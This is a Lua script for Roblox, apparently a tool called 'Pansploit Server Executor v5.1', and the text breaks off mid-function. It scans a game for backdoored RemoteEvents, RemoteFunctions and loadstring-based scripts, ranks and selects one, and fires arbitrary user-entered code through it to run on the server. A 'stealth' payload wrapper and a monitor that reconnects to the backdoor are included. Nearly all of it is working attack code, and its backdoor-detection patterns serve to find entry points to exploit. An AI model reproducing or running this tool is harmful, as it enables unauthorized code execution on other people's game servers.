local _bs = {}
_bs._a = false
_bs._selected = nil
_bs._selectedType = nil
_bs._backup = {}
_bs._monitor = nil
_bs._gameMonitor = nil
_bs._r = {}
_bs._n = {}
_bs._f = {}
_bs._m = {}
_bs._s = tick()
_bs._cb = nil
_bs._currentGameId = nil
_bs._gui = nil
_bs._guiStatusDot = nil
_bs._guiStatusText = nil
_bs._guiConsole = nil

-- [FIXED] Persistent storage that survives reloads
if not _G._pans_backdoor_storage then
    _G._pans_backdoor_storage = {
        detectedBackdoors = {},  -- Store all detected backdoors
        selectedPath = nil,
        selectedType = nil
    }
end
local _storage = _G._pans_backdoor_storage

local _cfg = {
    debug = false,
    stealth = true,
    maxScanDepth = 25,
    executionDelay = 0.05,
    monitorInterval = 1.5,
    autoReconnect = true
}

local _str = {
    loadstring = ("\108\111\97\100\115\116\114\105\110\103"),
    require = ("\114\101\113\117\105\114\101"),
    RemoteEvent = ("\82\101\109\111\116\101\69\118\101\110\116"),
    RemoteFunction = ("\82\101\109\111\116\101\70\117\110\99\116\105\111\110"),
}

local _pat = {
    "loadstring%(%s*%)%(%)",
    "OnServerEvent%:Connect%(.-loadstring",
    "OnServerInvoke%s*=%s*function.-loadstring",
    "OnServerEvent:connect%(.-loadstring",
    "Instance%.new%([\"']RemoteEvent[\"'].-loadstring",
    "getfenv%(%s*%)%[%s*loadstring",
    "setfenv%(.-loadstring",
    "_G%[.-%].-loadstring",
    "rawset%(.-loadstring",
    "%(loadstring%)%(%)",
}

local _cat = {
    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback", "Bindable"},
    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect", "Spread", "getfenv", "setfenv"},
    backdoored = {"Admin", "HDAdmin", "Kohl", "BTools", "Gear", "Give", "Tools", "Command", "Cmd", "Ban", "Kick", "Kill"}
}

local _consoleLogs = {}
local _maxConsoleLines = 100

local function _addConsoleLog(message, msgType)
    msgType = msgType or "INFO"
    local timestamp = os.date("%H:%M:%S")
    local logEntry = string.format("[%s] [%s] %s", timestamp, msgType, message)
    
    table.insert(_consoleLogs, 1, logEntry)
    
    if #_consoleLogs > _maxConsoleLines then
        table.remove(_consoleLogs)
    end
    
    if _bs._guiConsole then
        pcall(function()
            _bs._guiConsole.Text = table.concat(_consoleLogs, "\n")
        end)
    end
end

local function _log(m, t)
    t = t or "INFO"
    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" or t == "GUI" or t == "INFECTED" or t == "MANAGER" then
        print(("[BD:%s] %s"):format(t, m))
    end
    if _bs._cb then _bs._cb(m, t) end
    _addConsoleLog(m, t)
end

local function _isBackdooredFunc(n)
    if not n then return false, 0 end
    n = tostring(n):lower()
    local score = 0
    for _, p in ipairs(_cat.backdoored) do
        if n:find(p:lower()) then score = score + 25 end
    end
    if n:find("function") or n:find("func") or n:find("callback") then
        score = score + 15
    end
    return score > 0, score
end

local function _isSus(n)
    if not n then return false, 0 end
    n = tostring(n):lower()
    local s = 0
    for _, p in ipairs(_cat.suspicious) do
        if n:find(p:lower()) then s = s + 30 end
    end
    return s > 0, s
end

local function _isNormal(n)
    if not n then return false end
    n = tostring(n):lower()
    for _, p in ipairs(_cat.normal) do
        if n:find(p:lower()) then return true end
    end
    return false
end

local function _analyzeScript(scr)
    if not scr or not scr:IsA("LuaSourceContainer") then return nil end
    
    local info = {
        Object = scr,
        Name = scr.Name,
        Path = scr:GetFullName(),
        Source = nil,
        SuspiciousPatterns = {},
        RiskScore = 0,
        IsBackdoor = false,
        ExecutionMethod = nil,
        EntryPoint = nil,
    }
    
    local ok, src = pcall(function() return scr.Source end)
    
    if not ok or not src or src == "" then
        local name = tostring(scr.Name):lower()
        if name:find("backdoor") or name:find("exploit") or name:find("virus") or name:find("admin") then
            info.RiskScore = 80
            info.IsBackdoor = true
            info.ExecutionMethod = "unknown"
            table.insert(info.SuspiciousPatterns, "suspicious_name_no_source")
        end
        return info.RiskScore > 50 and info or nil
    end
    
    info.Source = src
    
    local remoteEventPattern = "(%w+)[%.:]OnServerEvent[%.:]?[Cc]onnect%s*%(%s*function%s*%(%s*[%w_,%s]*%s*%)%s*loadstring%(([%w_]+)%)%(%)"
    local remoteName, paramName = src:match(remoteEventPattern)
    if remoteName and paramName then
        info.RiskScore = 100
        info.IsBackdoor = true
        info.ExecutionMethod = "remote_event_loadstring"
        info.EntryPoint = {
            type = "RemoteEvent",
            remoteName = remoteName,
            paramName = paramName
        }
        table.insert(info.SuspiciousPatterns, "remote_event_direct_loadstring")
    end
    
    if not info.IsBackdoor then
        local remoteFuncPattern = "(%w+)[%.:]OnServerInvoke%s*=%s*function%s*%(%s*[%w_,%s]*%s*%)%s*loadstring%(([%w_]+)%)%(%)"
        remoteName, paramName = src:match(remoteFuncPattern)
        if remoteName and paramName then
            info.RiskScore = 100
            info.IsBackdoor = true
            info.ExecutionMethod = "remote_function_loadstring"
            info.EntryPoint = {
                type = "RemoteFunction",
                remoteName = remoteName,
                paramName = paramName
            }
            table.insert(info.SuspiciousPatterns, "remote_function_direct_loadstring")
        end
    end
    
    if not info.IsBackdoor then
        for _, pattern in ipairs(_pat) do
            if src:find(pattern) then
                table.insert(info.SuspiciousPatterns, pattern)
                info.RiskScore = info.RiskScore + 40
            end
        end
    end
    
    if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']%s*%)") and src:find("loadstring") then
        info.RiskScore = info.RiskScore + 50
        info.ExecutionMethod = info.ExecutionMethod or "dynamic_remote"
        table.insert(info.SuspiciousPatterns, "dynamic_remote_creation")
    end
    
    if src:find("getfenv") or src:find("setfenv") then
        info.RiskScore = info.RiskScore + 30
        table.insert(info.SuspiciousPatterns, "env_manipulation")
    end
    
    if src:find("_G%s*%[") or src:find("shared%s*%[") or src:find("getrawmetatable") then
        info.RiskScore = info.RiskScore + 20
        table.insert(info.SuspiciousPatterns, "global_manipulation")
    end
    
    info.IsBackdoor = info.RiskScore >= 60
    return info.RiskScore > 30 and info or nil
end

local function _scan(i, d)
    d = d or 0
    if d > _cfg.maxScanDepth then return {}, {}, {}, {} end
    
    local rmt = {}
    local scr = {}
    local mdl = {}
    local funcs = {}
    
    local success, isRemote = pcall(function()
        return i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction)
    end)
    
    if success and isRemote then
        local sus, score = _isSus(i.Name)
        local norm = _isNormal(i.Name)
        local backdoored, bdScore = _isBackdooredFunc(i.Name)
        local cat = "UNKNOWN"
        
        if sus then
            cat = "MALICIOUS"
            score = score + bdScore
        elseif backdoored then
            cat = "BACKDOORED_FUNC"
            score = score + bdScore + 40
        elseif norm then
            cat = "NORMAL"
        end
        
        local id = ""
        pcall(function() id = i:GetDebugId() end)
        
        local entry = {
            Object = i,
            Name = i.Name,
            Type = i.ClassName,
            Path = i:GetFullName(),
            Category = cat,
            RiskScore = score or 0,
            Suspicious = sus,
            IsBackdooredFunc = backdoored,
            Parent = i.Parent,
            Depth = d,
            InstanceId = id
        }
        
        if cat == "BACKDOORED_FUNC" then
            table.insert(funcs, entry)
        else
            table.insert(rmt, entry)
        end
    end
    
    local isScript = pcall(function()
        return i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript")
    end)
    
    if isScript then
        local analysis = _analyzeScript(i)
        if analysis then
            table.insert(scr, analysis)
        end
    end
    
    local isModel = pcall(function()
        return i:IsA("Model") or i:IsA("Folder")
    end)
    
    if isModel then
        local children = {}
        pcall(function() children = i:GetDescendants() end)
        
        for _, desc in ipairs(children) do
            local isServerScript = pcall(function()
                return desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server
            end)
            
            if isServerScript then
                local n = tostring(desc.Name)
                if #n > 50 or n:find("[\128-\255]") or n:match("^%s+$") or not desc.Archivable then
                    table.insert(mdl, {Model = i, Script = desc, Reason = "hidden_server"})
                    break
                end
            end
        end
    end
    
    local children = {}
    pcall(function() children = i:GetChildren() end)
    
    for _, c in ipairs(children) do
        local cr, cs, cm, cf = _scan(c, d + 1)
        for _, v in ipairs(cr) do table.insert(rmt, v) end
        for _, v in ipairs(cs) do table.insert(scr, v) end
        for _, v in ipairs(cm) do table.insert(mdl, v) end
        for _, v in ipairs(cf) do table.insert(funcs, v) end
    end
    
    return rmt, scr, mdl, funcs
end

local function _test(r, depth)
    depth = depth or 0
    if depth > 3 then return false, nil, 0 end
    
    local v = false
    local m = nil
    local c = r.RiskScore or 0
    
    local p = r.Parent
    if p then
        local pn = tostring(p.Name):lower()
        if pn:find("backdoor") or pn:find("exploit") or pn:find("virus") then
            v = true
            m = "infected_container"
            c = c + 50
        end
        
        if r.IsBackdooredFunc then
            v = true
            m = "backdoored_admin_system"
            c = c + 60
        end
        
        local isModel = pcall(function() return p:IsA("Model") end)
        if isModel then
            local children = {}
            pcall(function() children = p:GetDescendants() end)
            
            for _, d in ipairs(children) do
                local isScript = pcall(function() return d:IsA("Script") end)
                if isScript then
                    local dn = tostring(d.Name)
                    if dn:sub(1,1) == "\0" or dn:find("\239\191\189") then
                        v = true
                        m = m or "hidden_script"
                        c = c + 40
                        r.InfectedModel = p
                        break
                    end
                end
            end
        end
    end
    
    if r.Category == "MALICIOUS" or r.Category == "BACKDOORED_FUNC" then
        v = true
        m = m or "categorized_" .. r.Category:lower()
        c = c + 30
    end
    
    local ok, attrs = pcall(function()
        return r.Object:GetAttribute("Backdoor") or r.Object:GetAttribute("Exploit")
    end)
    if ok and attrs then
        v = true
        m = m or "marked_attribute"
        c = c + 100
    end
    
    return v, m, c
end

local function _selectRandomBackdoor(backdoors)
    if #backdoors == 0 then return nil, {} end
    if #backdoors == 1 then return backdoors[1], {} end
    
    table.sort(backdoors, function(a, b)
        if a.Category == "BACKDOORED_FUNC" and b.Category ~= "BACKDOORED_FUNC" then
            return true
        elseif a.Category ~= "BACKDOORED_FUNC" and b.Category == "BACKDOORED_FUNC" then
            return false
        else
            return (a.Confidence or 0) > (b.Confidence or 0)
        end
    end)
    
    local selected = backdoors[1]
    local backup = {}
    for i = 2, #backdoors do
        table.insert(backup, backdoors[i])
    end
    
    return selected, backup
end

local function _createGUI()
    if _bs._gui then
        pcall(function() _bs._gui:Destroy() end)
    end
    
    _consoleLogs = {}
    
    local player = game:GetService("Players").LocalPlayer
    if not player then return nil end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PanExecutorV5"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    pcall(function()
        screenGui.Parent = game:GetService("CoreGui")
    end)
    
    if not screenGui.Parent then
        screenGui.Parent = player:WaitForChild("PlayerGui")
    end
    
    _bs._gui = screenGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 500, 0, 400)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame
    
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.Size = UDim2.new(1, 20, 1, 20)
    shadow.Position = UDim2.new(0, -10, 0, -10)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.6
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
    shadow.ZIndex = -1
    shadow.Parent = mainFrame
    
    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 35)
    titleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar
    
    local titleFix = Instance.new("Frame")
    titleFix.Size = UDim2.new(1, 0, 0.5, 0)
    titleFix.Position = UDim2.new(0, 0, 0.5, 0)
    titleFix.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    titleFix.BorderSizePixel = 0
    titleFix.Parent = titleBar
    
    local titleText = Instance.new("TextLabel")
    titleText.Name = "Title"
    titleText.Size = UDim2.new(1, -150, 1, 0)
    titleText.Position = UDim2.new(0, 15, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "[Pansploit] Server Executor v5.1"
    titleText.TextColor3 = Color3.fromRGB(0, 200, 255)
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 16
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar
    
    local statusFrame = Instance.new("Frame")
    statusFrame.Name = "StatusFrame"
    statusFrame.Size = UDim2.new(0, 100, 0, 25)
    statusFrame.Position = UDim2.new(1, -110, 0.5, -12)
    statusFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    statusFrame.BorderSizePixel = 0
    statusFrame.Parent = titleBar
    
    local statusCorner2 = Instance.new("UICorner")
    statusCorner2.CornerRadius = UDim.new(0, 6)
    statusCorner2.Parent = statusFrame
    
    local statusDot = Instance.new("Frame")
    statusDot.Name = "StatusDot"
    statusDot.Size = UDim2.new(0, 10, 0, 10)
    statusDot.Position = UDim2.new(0, 8, 0.5, -5)
    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    statusDot.BorderSizePixel = 0
    statusDot.Parent = statusFrame
    
    local statusDotCorner = Instance.new("UICorner")
    statusDotCorner.CornerRadius = UDim.new(1, 0)
    statusDotCorner.Parent = statusDot
    
    local statusText = Instance.new("TextLabel")
    statusText.Name = "StatusText"
    statusText.Size = UDim2.new(1, -25, 1, 0)
    statusText.Position = UDim2.new(0, 22, 0, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Active"
    statusText.TextColor3 = Color3.fromRGB(0, 255, 100)
    statusText.Font = Enum.Font.GothamSemibold
    statusText.TextSize = 12
    statusText.Parent = statusFrame
    
    _bs._guiStatusDot = statusDot
    _bs._guiStatusText = statusText
    
    local minButton = Instance.new("TextButton")
    minButton.Name = "Minimize"
    minButton.Size = UDim2.new(0, 30, 0, 25)
    minButton.Position = UDim2.new(1, -75, 0, 5)
    minButton.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
    minButton.Text = "−"
    minButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    minButton.Font = Enum.Font.GothamBold
    minButton.TextSize = 18
    minButton.Parent = titleBar
    
    local minCorner = Instance.new("UICorner")
    minCorner.CornerRadius = UDim.new(0, 6)
    minCorner.Parent = minButton
    
    local closeButton = Instance.new("TextButton")
    closeButton.Name = "Close"
    closeButton.Size = UDim2.new(0, 30, 0, 25)
    closeButton.Position = UDim2.new(1, -40, 0, 5)
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    closeButton.Text = "×"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Font = Enum.Font.GothamBold
    closeButton.TextSize = 18
    closeButton.Parent = titleBar
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 6)
    closeCorner.Parent = closeButton
    
    local textBoxFrame = Instance.new("Frame")
    textBoxFrame.Name = "TextBoxFrame"
    textBoxFrame.Size = UDim2.new(1, -20, 0, 140)
    textBoxFrame.Position = UDim2.new(0, 10, 0, 45)
    textBoxFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    textBoxFrame.BorderSizePixel = 0
    textBoxFrame.Parent = mainFrame
    
    local textBoxCorner = Instance.new("UICorner")
    textBoxCorner.CornerRadius = UDim.new(0, 8)
    textBoxCorner.Parent = textBoxFrame
    
    local textBox = Instance.new("TextBox")
    textBox.Name = "ScriptBox"
    textBox.Size = UDim2.new(1, -10, 1, -10)
    textBox.Position = UDim2.new(0, 5, 0, 5)
    textBox.BackgroundTransparency = 1
    textBox.TextColor3 = Color3.fromRGB(240, 240, 240)
    textBox.PlaceholderText = "-- Enter server-side script here (require, loadstring, etc.)..."
    textBox.Text = ""
    textBox.Font = Enum.Font.Code
    textBox.TextSize = 13
    textBox.TextXAlignment = Enum.TextXAlignment.Left
    textBox.TextYAlignment = Enum.TextYAlignment.Top
    textBox.ClearTextOnFocus = false
    textBox.MultiLine = true
    textBox.TextWrapped = true
    textBox.Parent = textBoxFrame
    
    local consoleFrame = Instance.new("Frame")
    consoleFrame.Name = "ConsoleFrame"
    consoleFrame.Size = UDim2.new(1, -20, 0, 100)
    consoleFrame.Position = UDim2.new(0, 10, 0, 190)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    consoleFrame.BorderSizePixel = 0
    consoleFrame.Parent = mainFrame
    
    local consoleCorner = Instance.new("UICorner")
    consoleCorner.CornerRadius = UDim.new(0, 8)
    consoleCorner.Parent = consoleFrame
    
    local consoleLabel = Instance.new("TextLabel")
    consoleLabel.Name = "ConsoleLabel"
    consoleLabel.Size = UDim2.new(0, 60, 0, 20)
    consoleLabel.Position = UDim2.new(0, 5, 0, 0)
    consoleLabel.BackgroundTransparency = 1
    consoleLabel.Text = "Console"
    consoleLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    consoleLabel.Font = Enum.Font.GothamSemibold
    consoleLabel.TextSize = 11
    consoleLabel.Parent = consoleFrame
    
    local consoleText = Instance.new("TextLabel")
    consoleText.Name = "ConsoleText"
    consoleText.Size = UDim2.new(1, -10, 1, -25)
    consoleText.Position = UDim2.new(0, 5, 0, 20)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(200, 200, 200)
    consoleText.Font = Enum.Font.Code
    consoleText.TextSize = 11
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.Parent = consoleFrame
    
    _bs._guiConsole = consoleText
    
    local buttonFrame = Instance.new("Frame")
    buttonFrame.Name = "ButtonFrame"
    buttonFrame.Size = UDim2.new(1, -20, 0, 35)
    buttonFrame.Position = UDim2.new(0, 10, 1, -50)
    buttonFrame.BackgroundTransparency = 1
    buttonFrame.Parent = mainFrame
    
    local execButton = Instance.new("TextButton")
    execButton.Name = "Execute"
    execButton.Size = UDim2.new(0.24, -5, 1, 0)
    execButton.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
    execButton.Text = "▶ Execute"
    execButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    execButton.Font = Enum.Font.GothamBold
    execButton.TextSize = 14
    execButton.Parent = buttonFrame
    
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0, 8)
    execCorner.Parent = execButton
    
    local clearButton = Instance.new("TextButton")
    clearButton.Name = "Clear"
    clearButton.Size = UDim2.new(0.24, -5, 1, 0)
    clearButton.Position = UDim2.new(0.25, 0, 0, 0)
    clearButton.BackgroundColor3 = Color3.fromRGB(150, 120, 0)
    clearButton.Text = "🗑 Clear"
    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearButton.Font = Enum.Font.GothamBold
    clearButton.TextSize = 14
    clearButton.Parent = buttonFrame
    
    local clearCorner = Instance.new("UICorner")
    clearCorner.CornerRadius = UDim.new(0, 8)
    clearCorner.Parent = clearButton
    
    local discButton = Instance.new("TextButton")
    discButton.Name = "Disconnect"
    discButton.Size = UDim2.new(0.24, -5, 1, 0)
    discButton.Position = UDim2.new(0.50, 5, 0, 0)
    discButton.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
    discButton.Text = "⏹ Disconnect"
    discButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    discButton.Font = Enum.Font.GothamBold
    discButton.TextSize = 14
    discButton.Parent = buttonFrame
    
    local discCorner = Instance.new("UICorner")
    discCorner.CornerRadius = UDim.new(0, 8)
    discCorner.Parent = discButton
    
    local clearConsoleBtn = Instance.new("TextButton")
    clearConsoleBtn.Name = "ClearConsole"
    clearConsoleBtn.Size = UDim2.new(0.24, -5, 1, 0)
    clearConsoleBtn.Position = UDim2.new(0.75, 5, 0, 0)
    clearConsoleBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
    clearConsoleBtn.Text = "⌫ Clear Log"
    clearConsoleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearConsoleBtn.Font = Enum.Font.GothamBold
    clearConsoleBtn.TextSize = 14
    clearConsoleBtn.Parent = buttonFrame
    
    local clearConsoleCorner = Instance.new("UICorner")
    clearConsoleCorner.CornerRadius = UDim.new(0, 8)
    clearConsoleCorner.Parent = clearConsoleBtn
    
    execButton.MouseButton1Click:Connect(function()
        local script = textBox.Text
        if script and #script > 0 then
            _log("GUI: Execute clicked", "GUI")
            
            if not _bs._a then
                _log("GUI: Backdoor not active, attempting reactivation...", "GUI")
                _addConsoleLog("Backdoor not active, attempting reactivation...", "WARN")
            end
            
            local success = _bs.Execute(script)
            if success then
                _log("GUI: Execute SUCCESS", "GUI")
                _addConsoleLog("✓ Script executed successfully", "SUCCESS")
            else
                _log("GUI: Execute FAILED", "GUI")
                _addConsoleLog("✗ Script execution failed", "ERROR")
            end
        else
            _log("GUI: Empty script", "GUI")
            _addConsoleLog("⚠ Empty script", "WARN")
        end
    end)
    
    clearButton.MouseButton1Click:Connect(function()
        textBox.Text = ""
        _log("GUI: Script cleared", "GUI")
        _addConsoleLog("Script box cleared", "INFO")
    end)
    
    discButton.MouseButton1Click:Connect(function()
        _log("GUI: Disconnect clicked", "GUI")
        _addConsoleLog("Disconnecting from backdoor...", "INFO")
        
        _bs.Disconnect()
        
        _updateGUIStatus(false)
        
        _addConsoleLog("Disconnected from backdoor", "DISCONNECT")
        _log("GUI: Disconnected successfully", "GUI")
    end)
    
    clearConsoleBtn.MouseButton1Click:Connect(function()
        _consoleLogs = {}
        consoleText.Text = ""
        _log("GUI: Console cleared", "GUI")
    end)
    
    local minimized = false
    minButton.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            textBoxFrame.Visible = false
            consoleFrame.Visible = false
            buttonFrame.Position = UDim2.new(0, 10, 0, 45)
            mainFrame.Size = UDim2.new(0, 500, 0, 90)
            minButton.Text = "+"
        else
            textBoxFrame.Visible = true
            consoleFrame.Visible = true
            buttonFrame.Position = UDim2.new(0, 10, 1, -50)
            mainFrame.Size = UDim2.new(0, 500, 0, 400)
            minButton.Text = "−"
        end
    end)
    
    closeButton.MouseButton1Click:Connect(function()
        _log("GUI: Hidden (use ToggleGUI to show)", "GUI")
        screenGui.Enabled = false
    end)
    
    _addConsoleLog("PanExecutor v5.1 loaded", "INFO")
    _addConsoleLog("Waiting for backdoor activation...", "INFO")
    
    _log("GUI Created successfully", "GUI")
    return screenGui
end

local function _updateGUIStatus(isActive)
    if _bs._guiStatusDot and _bs._guiStatusText then
        if isActive then
            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
            _bs._guiStatusText.Text = "Active"
            _bs._guiStatusText.TextColor3 = Color3.fromRGB(0, 255, 100)
            _addConsoleLog("Status: Connected", "SUCCESS")
        else
            _bs._guiStatusDot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            _bs._guiStatusText.Text = "Disconnected"
            _bs._guiStatusText.TextColor3 = Color3.fromRGB(255, 50, 50)
            _addConsoleLog("Status: Disconnected", "ERROR")
        end
    end
end

local function _executeThroughInfectedScript(code, scriptInfo)
    if not scriptInfo or not scriptInfo.Object then
        return false
    end
    
    local scr = scriptInfo.Object
    
    local exists = pcall(function() return scr.Parent end)
    if not exists then
        _log("Infected script no longer exists", "ERROR")
        return false
    end
    
    if scriptInfo.EntryPoint then
        local ep = scriptInfo.EntryPoint
        
        local remote = nil
        local searchRoot = scr.Parent or game:GetService("ReplicatedStorage")
        
        local children = {}
        pcall(function() children = searchRoot:GetDescendants() end)
        
        for _, obj in ipairs(children) do
            if obj.Name == ep.remoteName and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                remote = obj
                break
            end
        end
        
        if remote then
            _log("Using infected script entry point: " .. ep.type, "INFECTED")
            
            if ep.type == "RemoteEvent" then
                pcall(function() remote:FireServer(code) end)
                return true
            elseif ep.type == "RemoteFunction" then
                pcall(function() remote:InvokeServer(code) end)
                return true
            end
        end
    end
    
    local parent = scr.Parent
    if parent then
        local children = {}
        pcall(function() children = parent:GetChildren() end)
        
        for _, obj in ipairs(children) do
            if obj:IsA("RemoteEvent") then
                _log("Using sibling RemoteEvent in infected container", "INFECTED")
                pcall(function() obj:FireServer(code) end)
                return true
            elseif obj:IsA("RemoteFunction") then
                _log("Using sibling RemoteFunction in infected container", "INFECTED")
                pcall(function() obj:InvokeServer(code) end)
                return true
            end
        end
    end
    
    return false
end

local function _undetectableExec(code)
    if not _bs._selected then
        _log("No backdoor selected", "ERROR")
        return false
    end
    
    if _bs._selectedType == "script" and _bs._selected.ScriptInfo then
        return _executeThroughInfectedScript(code, _bs._selected.ScriptInfo)
    end
    
    local r = _bs._selected.Object
    local t = _bs._selected.Type
    
    local exists = pcall(function() return r.Parent end)
    if not exists then
        _log("Backdoor no longer exists!", "ERROR")
        _bs.Disconnect()
        return false
    end
    
    local function method1()
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(code) end)
        else
            pcall(function() r:InvokeServer(code) end)
        end
    end
    
    local function method4()
        local payload = ([[
            local _c = "%s"
            local _f = loadstring or load
            if _f then pcall(_f, _c) end
        ]]):format(code:gsub("\"", "\\\""))
        
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(payload) end)
        else
            pcall(function() r:InvokeServer(payload) end)
        end
    end
    
    if _cfg.stealth then
        local ok1 = pcall(method4)
        if ok1 then return true end
        local ok2 = pcall(method1)
        return ok2
    else
        local ok = pcall(method1)
        return ok
    end
end

local function _findBackdoorByPath(path)
    if not path then return nil end
    
    -- First check storage
    if _storage.detectedBackdoors then
        for _, bd in ipairs(_storage.detectedBackdoors) do
            if bd.Path == path then
                -- Reconstruct the backdoor entry
                return {
                    Path = bd.Path,
                    Name = bd.Name,
                    Type = bd.Type,
                    Category = bd.Category,
                    ExecutionMethod = bd.ExecutionMethod,
                    Confidence = bd.Confidence,
                    Object = nil -- Will be found dynamically
                }
            end
        end
    end
    
    -- Try to find in game
    local segments = {}
    for segment in string.gmatch(path, "[^%.]+") do
        table.insert(segments, segment)
    end
    
    local current = game
    for i, segment in ipairs(segments) do
        if segment == "game" then
            current = game
        else
            local found = nil
            local children = {}
            pcall(function() children = current:GetChildren() end)
            
            for _, child in ipairs(children) do
                if child.Name == segment then
                    found = child
                    break
                end
            end
            
            if not found then
                local ok, svc = pcall(function() return game:GetService(segment) end)
                if ok and svc then
                    found = svc
                else
                    return nil
                end
            end
            
            current = found
        end
    end
    
    local isValid = pcall(function()
        return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
    end)
    
    if isValid then
        return {
            Object = current,
            Name = current.Name,
            Type = current.ClassName,
            Path = path,
            Category = "MALICIOUS",
            Vulnerable = true,
            ExecutionMethod = "reactivated"
        }
    end
    
    return nil
end

local function _quickScan()
    local quickServices = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace")
    }
    
    local foundRemotes = {}
    
    for _, svc in ipairs(quickServices) do
        local children = {}
        pcall(function() children = svc:GetDescendants() end)
        
        for _, obj in ipairs(children) do
            local isRemote = pcall(function()
                return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
            end)
            
            if isRemote then
                local sus, score = _isSus(obj.Name)
                local backdoored, bdScore = _isBackdooredFunc(obj.Name)
                
                if sus or backdoored then
                    table.insert(foundRemotes, {
                        Object = obj,
                        Name = obj.Name,
                        Type = obj.ClassName,
                        Path = obj:GetFullName(),
                        Category = backdoored and "BACKDOORED_FUNC" or "MALICIOUS",
                        RiskScore = score + bdScore,
                        Vulnerable = true,
                        ExecutionMethod = "quick_reactivate"
                    })
                end
            end
        end
    end
    
    if #foundRemotes > 0 then
        local selected, backup = _selectRandomBackdoor(foundRemotes)
        _bs._selected = selected
        _bs._backup = backup
        _bs._selectedType = "remote"
        return true
    end
    
    return false
end

local function _startMonitoring()
    if _bs._monitor then
        pcall(function() _bs._monitor:Disconnect() end)
        _bs._monitor = nil
    end
    
    if not _bs._selected or not _bs._selected.Object then
        _log("No backdoor to monitor", "WARN")
        return
    end
    
    local target = _bs._selected.Object
    local parent = target.Parent
    local name = target.Name
    local path = _bs._selected.Path
    
    _storage.selectedPath = path
    _storage.selectedType = _bs._selectedType
    
    _log("Monitoring: " .. path, "MONITOR")
    
    local lastCheck = tick()
    local rs = game:GetService("RunService")
    
    _bs._monitor = rs.Heartbeat:Connect(function()
        if tick() - lastCheck < _cfg.monitorInterval then return end
        lastCheck = tick()
        
        local exists, currentParent, currentName = pcall(function()
            return target.Parent, target.Name
        end)
        
        if not exists then
            _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
        
        if currentParent ~= parent then
            _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
        
        if currentName ~= name then
            _log("BACKDOOR_RENAMED: " .. path, "DISCONNECT")
            _updateGUIStatus(false)
